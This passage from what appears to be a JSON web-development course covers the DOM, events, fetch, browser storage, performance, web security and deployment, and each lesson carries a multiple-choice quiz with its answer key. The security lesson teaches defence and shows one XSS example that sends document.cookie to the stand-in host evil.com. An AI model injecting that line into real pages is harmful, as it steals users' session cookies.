     "text": "document.querySelector() finds the first element matching a CSS selector; querySelectorAll() finds all of them, returned as a list you can loop over. Once you have an element, you can read or change its text, its attributes, its classes, and its inline styles."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "const card = document.createElement('div');\ncard.className = 'card';\ncard.textContent = 'New item';\ndocument.body.appendChild(card);"
    },
    {
     "type": "text",
     "text": "You can also build entirely new elements with createElement() and insert them into the page with methods like appendChild() or insertBefore(). This is how JavaScript can add or remove content without ever reloading the page."
    },
    {
     "type": "tip",
     "text": "Reading or writing the DOM is slower than plain JavaScript variables, because the browser may need to repaint the screen. When changing many elements at once, build up the changes first and apply them together rather than touching the DOM in a loop."
    }
   ],
   "recap": "The DOM represents the page as objects JavaScript can inspect and modify; querySelector finds elements, and createElement/appendChild let scripts build and insert new content live."
  },
  "quiz": [
   {
    "q": "What does the DOM represent?",
    "options": [
     "The browser's cache",
     "The server's file system",
     "A database schema",
     "The web page as a tree of objects JavaScript can manipulate"
    ],
    "answer": 3,
    "explain": "The DOM is the in-memory object representation of the HTML page that scripts can read and modify."
   },
   {
    "q": "Which method finds the FIRST element matching a CSS selector?",
    "options": [
     "createElement()",
     "querySelector()",
     "getElementById() only",
     "querySelectorAll()"
    ],
    "answer": 1,
    "explain": "querySelector() returns only the first matching element; querySelectorAll() returns all of them."
   },
   {
    "q": "How do you add a newly created element to the visible page?",
    "options": [
     "By calling something like appendChild() to insert it into the DOM tree",
     "By setting its color",
     "By reloading the page",
     "It appears automatically"
    ],
    "answer": 0,
    "explain": "A created element exists only in memory until it is inserted into the DOM tree, e.g. with appendChild()."
   },
   {
    "q": "Why is it wasteful to update the DOM element-by-element inside a large loop?",
    "options": [
     "The DOM only allows 10 changes",
     "It causes a syntax error",
     "JavaScript forbids it",
     "Each DOM change can trigger layout/repaint work, so many small changes add up"
    ],
    "answer": 3,
    "explain": "Repeated DOM changes can each cost the browser layout and repaint work, so batching changes is more efficient."
   }
  ]
 },
 "webdev-15": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "An event is something that happens in the browser: a click, a key press, a page finishing loading, a form being submitted. JavaScript can listen for these events and run code in response, which is the core of making a page interactive."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "const btn = document.querySelector('#save');\nbtn.addEventListener('click', function (event) {\n  console.log('Button clicked!');\n});"
    },
    {
     "type": "text",
     "text": "addEventListener() takes the event name (like 'click', 'input', or 'submit') and a function to run when it fires. That function receives an event object with details, such as event.target, the exact element the event happened on."
    },
    {
     "type": "text",
     "text": "Some events need to be stopped from doing their default browser behavior, most commonly a form's submit event, which by default reloads the page. Calling event.preventDefault() inside the handler stops that so your own JavaScript can handle the submission instead."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "form.addEventListener('submit', function (event) {\n  event.preventDefault();\n  console.log('Handling submit with JavaScript');\n});"
    },
    {
     "type": "tip",
     "text": "Events bubble upward from the exact element clicked through its ancestors. This lets you attach one listener to a parent container and still know which child was clicked via event.target — called event delegation, and it's efficient for long lists."
    }
   ],
   "recap": "addEventListener() attaches a function that runs when an event like click or submit fires; event.preventDefault() stops default browser behavior, and event bubbling enables efficient event delegation."
  },
  "quiz": [
   {
    "q": "What does addEventListener('click', handler) do?",
    "options": [
     "Deletes the element",
     "Runs handler every time the element is clicked",
     "Only works once ever",
     "Runs handler immediately"
    ],
    "answer": 1,
    "explain": "addEventListener attaches handler so it runs each time the specified event occurs on that element."
   },
   {
    "q": "Why call event.preventDefault() on a form's submit event?",
    "options": [
     "To speed up loading",
     "To delete the form",
     "It is required syntax",
     "To stop the browser's default full page reload so JavaScript can handle it"
    ],
    "answer": 3,
    "explain": "Forms reload the page by default on submit; preventDefault() stops that so a script can process the data instead."
   },
   {
    "q": "What does event.target refer to?",
    "options": [
     "The CSS file",
     "The exact element the event actually occurred on",
     "The browser tab",
     "The server URL"
    ],
    "answer": 1,
    "explain": "event.target is the specific element that triggered the event, useful when a listener sits on a parent container."
   },
   {
    "q": "What browser behavior makes event delegation possible?",
    "options": [
     "The DOM tree is read-only",
     "Events bubble up from the target through its ancestors",
     "Events only fire once per page",
     "CSS cascades"
    ],
    "answer": 1,
    "explain": "Because events bubble upward, a single listener on a parent can catch events from many children, identified via event.target."
   }
  ]
 },
 "webdev-16": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "AJAX (Asynchronous JavaScript and XML, though almost nobody uses XML anymore) is the technique of a web page fetching data from a server in the background, without a full page reload. This is how a page can update part of itself instantly."
    },
    {
     "type": "text",
     "text": "JSON (JavaScript Object Notation) is the format that data almost always travels in: plain text that looks like a JavaScript object, with keys and values, easy for both humans and machines to read."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "fetch('https://api.example.com/users/1')\n  .then(response => response.json())\n  .then(data => {\n    console.log(data.name);\n  })\n  .catch(error => console.error('Request failed:', error));"
    },
    {
     "type": "text",
     "text": "fetch() sends a request and returns a promise, an object representing a value that will arrive later. response.json() parses the reply's body as JSON and also returns a promise, which is why it's chained with another .then(). Any network failure lands in .catch()."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "async function loadUser() {\n  try {\n    const response = await fetch('/api/user/1');\n    const data = await response.json();\n    console.log(data);\n  } catch (error) {\n    console.error(error);\n  }\n}"
    },
    {
     "type": "tip",
     "text": "async/await is just cleaner syntax over the same promises — await pauses the function until the promise resolves, letting asynchronous code read top-to-bottom like ordinary synchronous code. Always wrap it in try/catch to handle failures."
    }
   ],
   "recap": "fetch() lets JavaScript request data from a server in the background and returns a promise; responses are usually parsed as JSON, and async/await makes that asynchronous code easy to read."
  },
  "quiz": [
   {
    "q": "What does fetch() return?",
    "options": [
     "The data immediately",
     "Nothing",
     "An HTML string",
     "A promise representing a value that will arrive later"
    ],
    "answer": 3,
    "explain": "fetch() is asynchronous and returns a promise; you use .then() or await to get the eventual response."
   },
   {
    "q": "Why is response.json() itself chained with another .then()?",
    "options": [
     "Because JSON is slow to write",
     "Because parsing the body as JSON is also asynchronous and returns its own promise",
     "It's a mistake, it isn't needed",
     "Because fetch() requires exactly two .then() calls"
    ],
    "answer": 1,
    "explain": "response.json() reads and parses the response body, which takes time, so it also returns a promise."
   },
   {
    "q": "What does the await keyword do inside an async function?",
    "options": [
     "Converts JSON to XML",
     "Skips the function entirely",
     "Runs code twice",
     "Pauses execution of that function until the awaited promise resolves"
    ],
    "answer": 3,
    "explain": "await pauses only the async function it's in until the promise settles, then continues with the resolved value."
   },
   {
    "q": "What format does data from a web API typically arrive in today?",
    "options": [
     "CSV only",
     "JSON",
     "XML, always",
     "Plain binary"
    ],
    "answer": 1,
    "explain": "JSON is the standard lightweight text format for exchanging data between a browser and a server today."
   }
  ]
 },
 "webdev-17": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "HTTP itself is stateless — the server doesn't remember you between requests. Browsers offer several ways to store small bits of data so a site can remember things like login state, preferences, or a shopping cart."
    },
    {
     "type": "text",
     "text": "A cookie is a small piece of text sent by the server and stored by the browser, then automatically resent with every future request to that same domain. Cookies are the classic way to keep a user logged in, but because they travel with every request, they should stay small."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "localStorage.setItem('theme', 'dark');\nconst theme = localStorage.getItem('theme');\nlocalStorage.removeItem('theme');"
    },
    {
     "type": "text",
     "text": "localStorage stores key-value pairs in the browser that persist even after the browser is closed and reopened, and it is never sent to the server automatically. sessionStorage works the same way, but its data is cleared as soon as that browser tab is closed."
    },
    {
     "type": "text",
     "text": "Both localStorage and sessionStorage only store strings, so storing an object means converting it with JSON.stringify() first, then parsing it back with JSON.parse() when reading it."
    },
    {
     "type": "tip",
     "text": "Never store sensitive data like passwords or raw session tokens in localStorage — it is readable by any JavaScript running on the page, which makes it vulnerable if the site ever has an XSS bug. Cookies marked HttpOnly are safer for authentication tokens because JavaScript cannot read them at all."
    }
   ],
   "recap": "Cookies are sent automatically with every request to a domain and suit login state; localStorage persists client-side data across sessions, sessionStorage clears when the tab closes, and both only store strings via JSON."
  },
  "quiz": [
   {
    "q": "What is a key difference between localStorage and sessionStorage?",
    "options": [
     "sessionStorage clears when the tab is closed, localStorage persists",
     "There is no difference",
     "localStorage is sent to the server automatically",
     "sessionStorage can store objects directly"
    ],
    "answer": 0,
    "explain": "sessionStorage data disappears once the tab closes, while localStorage sticks around across browser sessions until explicitly removed."
   },
   {
    "q": "Why must you use JSON.stringify() before storing an object in localStorage?",
    "options": [
     "localStorage only accepts strings",
     "It compresses the data",
     "It is required by HTTP",
     "It encrypts the data"
    ],
    "answer": 0,
    "explain": "Web Storage APIs only store string values, so objects must be serialized to a string first."
   },
   {
    "q": "What makes a cookie different from localStorage for storing data?",
    "options": [
     "Cookies are automatically sent with every HTTP request to the same domain",
     "Cookies cannot store text",
     "Cookies never expire",
     "Cookies are only for images"
    ],
    "answer": 0,
    "explain": "Unlike localStorage, cookies are attached automatically to every outgoing request to their domain, which is why they suit session identification."
   },
   {
    "q": "Why is storing an auth token in plain localStorage risky?",
    "options": [
     "It requires HTTPS to work at all",
     "It uses too much disk space",
     "Any JavaScript on the page, including injected malicious script, can read it",
     "It's too slow"
    ],
    "answer": 2,
    "explain": "localStorage is readable by any script running on the page, so an XSS vulnerability could let an attacker steal the token."
   }
  ]
 },
 "webdev-18": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "A slow site loses users: studies repeatedly show visitors abandon pages that take more than a few seconds to load. Performance optimization is about cutting the time between a request and a usable page."
    },
    {
     "type": "text",
     "text": "Images are usually the biggest weight on a page, so compressing them and using modern formats like WebP, plus loading offscreen images only when needed with loading=\"lazy\", cuts initial load time significantly."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<img src=\"banner.webp\" alt=\"Banner\" loading=\"lazy\">"
    },
    {
     "type": "text",
     "text": "Minification strips unnecessary characters (whitespace, comments) from CSS and JavaScript files to shrink them before they're sent to the browser. Bundling combines many small files into fewer, larger ones to cut down the number of separate network requests."
    },
    {
     "type": "text",
     "text": "A Content Delivery Network (CDN) stores copies of your static files on servers around the world, so a visitor downloads them from a location physically near them instead of one distant server, cutting latency. Browser caching also lets repeat visitors reuse files they already downloaded instead of fetching them again."
    },
    {
     "type": "tip",
     "text": "Measure before you optimize. Browser DevTools' Network and Lighthouse/Performance tabs show exactly which requests and scripts are slow, so you fix the real bottleneck instead of guessing."
    }
   ],
   "recap": "Web performance improves by compressing and lazy-loading images, minifying and bundling code, serving static files from a CDN, and caching — always measured first with tools like DevTools or Lighthouse."
  },
  "quiz": [
   {
    "q": "What does loading=\"lazy\" on an <img> tag do?",
    "options": [
     "Removes the image entirely",
     "Compresses the image automatically",
     "Blurs the image",
     "Delays loading the image until it's about to scroll into view"
    ],
    "answer": 3,
    "explain": "Lazy loading defers offscreen images until they're needed, reducing the initial page load's weight."
   },
   {
    "q": "What is minification?",
    "options": [
     "Compressing videos",
     "Making images smaller in dimensions",
     "Deleting unused pages",
     "Stripping unnecessary characters like whitespace and comments from code files"
    ],
    "answer": 3,
    "explain": "Minification removes characters that don't affect execution, shrinking CSS/JS file size without changing behavior."
   },
   {
    "q": "What is the main benefit of a CDN?",
    "options": [
     "It replaces the need for a database",
     "It serves static files from a location physically closer to the visitor, cutting latency",
     "It writes your code for you",
     "It encrypts all traffic automatically"
    ],
    "answer": 1,
    "explain": "A CDN distributes copies of files across many locations so users download from a nearby server instead of one far away."
   },
   {
    "q": "What is the recommended first step before optimizing performance?",
    "options": [
     "Remove all images",
     "Measure with tools like DevTools or Lighthouse to find the real bottleneck",
     "Disable JavaScript",
     "Rewrite the whole site in a new framework"
    ],
    "answer": 1,
    "explain": "Measuring first tells you which specific requests or scripts are actually slow, so effort goes to the real problem."
   }
  ]
 },
 "webdev-19": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "HTTPS is HTTP wrapped in encryption (TLS), so data traveling between browser and server can't be read or tampered with by anyone in between. Modern browsers mark plain HTTP sites as \"Not Secure,\" and HTTPS is now the baseline expectation for any real site."
    },
    {
     "type": "text",
     "text": "Cross-Site Scripting (XSS) happens when an attacker manages to inject their own JavaScript into a page that other users view, often by submitting malicious script through a comment box or search field that the site then displays unescaped."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<!-- Dangerous: raw user input inserted directly -->\n<div>Welcome, <script>document.location='https://evil.com?c='+document.cookie</script></div>"
    },
    {
     "type": "text",
     "text": "The fix is to always escape or sanitize user-provided content before displaying it, so characters like < and > are rendered as text rather than executed as HTML/JavaScript. Most modern frameworks escape output by default, which is one reason to trust them over hand-built string concatenation."
    },
    {
     "type": "text",
     "text": "Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into submitting a request they didn't intend, by relying on cookies the browser sends automatically. Sites defend against this with CSRF tokens: a hidden, unpredictable value the server checks on every state-changing request."
    },
    {
     "type": "tip",
     "text": "A simple rule covers most of this: never trust input, and never build HTML by directly concatenating raw user text. Escape it, and let your framework's built-in protections do the rest."
    }
   ],
   "recap": "HTTPS encrypts data in transit; XSS injects malicious script through unescaped user input, defended against by escaping/sanitizing output; CSRF forges requests using a victim's cookies, defended against with CSRF tokens."
  },
  "quiz": [
   {
    "q": "What does HTTPS add on top of plain HTTP?",
    "options": [
     "Encryption (TLS) so data can't be read or tampered with in transit",
     "Faster download speed",
     "Automatic backups",
     "Larger file size limits"
    ],
    "answer": 0,
    "explain": "HTTPS wraps HTTP traffic in TLS encryption, protecting data from eavesdropping and tampering as it travels."
   },
   {
    "q": "How does a typical XSS attack get malicious script onto a page?",
    "options": [
     "By injecting script through user input that the site displays without escaping",
     "By hacking the user's router",
     "By slowing down the CPU",
     "By changing the DNS server"
    ],
    "answer": 0,
    "explain": "XSS relies on unescaped user input being rendered as executable HTML/JavaScript on the page other users view."
   },
   {
    "q": "What is the main defense against XSS?",
    "options": [
     "Escaping/sanitizing user input before rendering it as HTML",
     "Using HTTPS",
     "Increasing server RAM",
     "Using a CDN"
    ],
    "answer": 0,
    "explain": "Escaping special characters prevents injected user input from being interpreted as executable code."
   },
   {
    "q": "What does a CSRF token protect against?",
    "options": [
     "Broken CSS layouts",
     "Slow page loads",
     "Large image files",
     "A logged-in user's browser being tricked into submitting an unintended request"
    ],
    "answer": 3,
    "explain": "A CSRF token is an unpredictable value the server checks, so a forged request from another site (without the token) is rejected."
   }
  ]
 },
 "webdev-20": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "Deployment is the process of getting your finished website onto a server where the public can reach it. This usually means a domain name (like example.com) pointed via DNS to a hosting provider, which stores your files and runs your server-side code."
    },
    {
     "type": "text",
     "text": "Static sites (plain HTML/CSS/JS with no server-side logic) can be hosted very cheaply or free on services like GitHub Pages, Netlify, or Vercel, which also build and deploy automatically whenever you push new code. Sites needing a database or server logic need a host that runs a backend, like a Node.js or Python server."
    },
    {
     "type": "text",
     "text": "Beyond plain HTML/CSS/JS, real production front-ends are usually built with a framework such as React, Vue, or Angular. These let you build a page out of reusable components — self-contained pieces combining structure, style, and behavior — and they efficiently re-render only the parts of the page that actually changed."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "// A React component, for a taste of the syntax\n// (real React code uses JSX like <h1>Hello, {name}!</h1>,\n// which compiles down to calls like this one)\nfunction Greeting(props) {\n  return React.createElement('h1', null, 'Hello, ' + props.name + '!');\n}"
    },
    {
     "type": "text",
     "text": "A Content Management System (CMS) like WordPress, or a headless CMS paired with a framework, lets non-developers edit content without touching code. Whichever stack is used, a CI/CD pipeline (continuous integration/continuous deployment) automatically tests and deploys every change, so updates ship safely and quickly."
    },
    {
     "type": "tip",
     "text": "For a placement interview, be ready to explain the full journey of a request: browser resolves the domain via DNS, connects to the host over HTTPS, the server (static file or backend framework) responds, and the browser renders and runs the page. That end-to-end picture is what separates someone who wrote HTML once from someone who understands the web."
    }
   ],
   "recap": "Deployment connects a domain via DNS to a host that serves your files or runs your backend; modern front-ends are usually built with component-based frameworks like React, and CI/CD pipelines automate testing and deployment."
  },
  "quiz": [
   {
    "q": "What is required to point a domain name at your hosting provider?",
    "options": [
     "A local cookie",
     "A CSS media query",
     "DNS records connecting the domain to the host's server",
     "A CSRF token"
    ],
    "answer": 2,
    "explain": "DNS translates the human-readable domain name into the server address where your site is actually hosted."
   },
   {
    "q": "What is a 'component' in a framework like React?",
    "options": [
     "A type of CSS unit",
     "A self-contained, reusable piece combining structure, style, and behavior",
     "A database table",
     "A DNS record"
    ],
    "answer": 1,
    "explain": "Components let developers build UIs out of reusable, self-contained building blocks rather than one long page of markup."
   },
   {
    "q": "What kind of site can typically be hosted for free on something like GitHub Pages?",
    "options": [
     "Only sites written in Python",
     "Only sites larger than 1GB",
     "A static site with only HTML/CSS/JS and no server-side logic",
     "Any site with a full database backend"
    ],
    "answer": 2,
    "explain": "Static hosting serves fixed files directly and doesn't run server-side code, so it suits static HTML/CSS/JS sites well."
   },
   {
    "q": "What does a CI/CD pipeline automate?",
    "options": [
     "Testing and deploying code changes automatically",
     "Writing the HTML for you",
     "Designing the page layout",
     "Choosing a domain name"
    ],
    "answer": 0,
    "explain": "CI/CD pipelines automatically run tests and push validated changes to production, making deployment faster and safer."
   }
  ]
 }
}
